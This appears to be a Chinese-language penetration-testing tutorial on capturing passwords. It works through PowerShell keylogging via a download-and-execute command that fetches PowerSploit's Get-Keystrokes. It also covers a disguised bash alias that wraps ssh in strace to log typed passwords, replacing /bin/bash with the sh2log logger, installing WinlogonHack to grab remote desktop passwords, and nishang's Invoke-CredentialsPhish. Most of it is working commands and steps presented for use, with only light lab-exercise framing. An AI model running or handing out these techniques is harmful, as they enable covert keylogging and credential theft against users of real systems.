# 密码记录

#### 键盘记录 <a id="-"></a>

**Windows Powershell**

```text
iex (new-object net.webclient).downloadstring(‘https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Exfiltration/Get-Keystrokes.ps1’); Get-Keystrokes –Logpath C:\log.txt
```

![](https://p408.ssl.qhimgs4.com/t01b88c8c99ce2aeb09.png)

**Linux alias**

在~/.bashrc下添加如下一行：

```text
alias ssh='strace -o /var/tmp/.syscache-`date +'%Y-%m-%d+%H:%m:%S'`.log -s 4096 ssh'
```

使更改生效：

```text
source ~/.bashrc
apt-get install strace        //若缺少此软件，需要安装
```

当有用户使用ssh命令时：

![](https://p408.ssl.qhimgs4.com/t01023d5bc908b02a03.png)

会生成一个Log文件：

![](https://p408.ssl.qhimgs4.com/t01eddaeec76331d552.png)

但是内容特别多，需要筛选：

```text
cat .syscache-2018-11-20+14\:11\:54.log  | grep  "read(4"
```

![](https://p408.ssl.qhimgs4.com/t019d12591756372144.png)

**sh2log**

登录ubuntu主机，下载sh2log：

```text
wget http://packetstorm.foofus.com/UNIX/loggers/sh2log-1.0.tgz
```

![](https://p408.ssl.qhimgs4.com/t013024bb0eca4633a8.png)

解压压缩包

```text
tar –xvf sh2log-1.0.tgz
```

![](https://p408.ssl.qhimgs4.com/t01a724f1ed8f0f6147.png)

Cd进入sh2log-1.0文件夹 安装libx11-dev

![](https://p408.ssl.qhimgs4.com/t01bbf9b1ec5315bf53.png)

安装完成后，编译sh2log：

输入make linux

![](https://p408.ssl.qhimgs4.com/t012a38860736d07456.png)

新建一个shell脚本，脚本内容如下：

```text
sudo mkdir /bin/shells/
sudo cp -p /bin/{sh,bash} /bin/shells/
sudo rm -f /bin/{sh,bash}
sudo cp -p sh2log /bin/bash
sudo cp -p sh2log /bin/sh
 ./sh2logd
```

![](https://p408.ssl.qhimgs4.com/t0149ed40c4bd9928af.png)

保存脚本，添加执行权限：

```text
chmod +x  ./1.sh
```

运行脚本：

```text
./1.sh
```

![](https://p408.ssl.qhimgs4.com/t0190aaaf0cf69f85cf.png)

输入bash，打开一个新的shell，随意输入一些命令 之后使用文件夹中的parser工具，

```text
./parser sh2log-xxxxx.bin
```

![](https://p408.ssl.qhimgs4.com/t0138c0bfbeff709f8a.png)

![](https://p408.ssl.qhimgs4.com/t01119b53b35c539c59.png)

**winlogonhack**

1、载winlogonhack，在windows xp环境下安装、抓取远程连接密码，最后卸载。要求不能直接点击bat文件安装，需要打开bat文件查看内容并简述安装的过程。

下载地址：[http://huaidan.org/wp-content/uploads/200712/WinlogonHack.rar](http://huaidan.org/wp-content/uploads/200712/WinlogonHack.rar)

下载完成后右键打开install.bat

![](https://p408.ssl.qhimgs4.com/t01b08dea31ed5e6b6b.png)

![](https://p408.ssl.qhimgs4.com/t013c0f0bf524db8679.png)

自述每条命令的意思，并逐条执行，执行过程略

打开远程桌面

在我的电脑上右键，选择属性

![](https://p408.ssl.qhimgs4.com/t0193e7164b48d670d2.png)

![](https://p408.ssl.qhimgs4.com/t01f63ffd419f8cb7e8.png)

选择远程，勾选允许远程用户连接到此计算机

![](https://p408.ssl.qhimgs4.com/t01c63aa73db53726ad.png)打开readlog.bat

![](https://p408.ssl.qhimgs4.com/t01a09393044c103405.png)根据代码找到密码保存的位置并打开

![](https://p408.ssl.qhimgs4.com/t01a52bb0755decaec6.png)

打开uninstall.bat,自述命令的意思

![](https://p408.ssl.qhimgs4.com/t0156be54c50faf2e8c.png)

**Invoke-CredentialsPhish.ps1**

下载地址：

[https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-CredentialsPhish.ps1](https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-CredentialsPhish.ps1)

远程下载执行过程略

在弹出的对话框中输入正确的凭证

![](https://p408.ssl.qhimgs4.com/t0178b496839f9967b0.png)查看结果

![](https://p408.ssl.qhimgs4.com/t01e825b0868dd082d2.png)

